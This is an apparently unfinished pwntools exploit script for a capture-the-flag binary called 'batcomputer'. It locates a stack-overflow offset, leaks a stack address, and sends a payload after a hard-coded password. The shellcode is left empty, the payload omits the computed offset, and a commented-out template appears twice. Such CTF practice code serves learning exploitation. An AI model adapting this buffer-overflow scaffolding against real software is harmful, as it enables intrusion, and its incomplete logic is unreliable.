from pwn import *
import re


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        p = remote(sys.argv[1], sys.argv[2])
    else:  # Run locally
        return process([exe], argv, *a, **kw)


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '2')
    p.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')
    p.sendlineafter('Enter the navigation commands: ', payload)
    p.sendlineafter('>', '4444')
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP offset at {a}'.format(a=ip_offset))
    # Return the EIP offset
    return ip_offset


# Specify gdbscript
gdbscript = '''
pwndbg
breakrva 0x000011ec
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './batcomputer'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
context.encoding = 'utf8'

##### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
offset = find_eip(cyclic(100))

io = start()
io.sendlineafter('>', '1')
#print(io.recvlineS())

# Get out pivot address (this changes each time)

leaked_stck_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info('stack addr: %#x', leaked_stck_addr)

#shellcode =

# Build the payload
payload = flat(
    [leaked_stck_addr]
)

io.sendlineafter('>', '2')
io.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')
io.sendlineafter('Enter the navigation commands: ', payload)
io.sendlineafter('>', '4444')

print(io.recv())




## Start program
#io = process()
## io = remote('server', 1337)
#
## Build the payload
#payload = flat({
#    offset: ""
#})
#
## gdb.attach(io, gdbscript='''
## init.pwndbg
## ''')
#
## Save the payload to file
#write('payload', payload)
#
## Send the payload
#io.sendlineafter('Hello good sir!', payload)
#io.recvuntil("Here's a small gift: \n")
#
## Get the flag
#flag = io.recv()
#success(flag)

## Start program
#io = process()
## io = remote('server', 1337)
#
## Build the payload
#payload = flat({
#    offset: ""
#})
#
## gdb.attach(io, gdbscript='''
## init.pwndbg
## ''')
#
## Save the payload to file
#write('payload', payload)
#
## Send the payload
#io.sendlineafter('Hello good sir!', payload)
#io.recvuntil("Here's a small gift: \n")
#
## Get the flag
#flag = io.recv()
#success(flag)
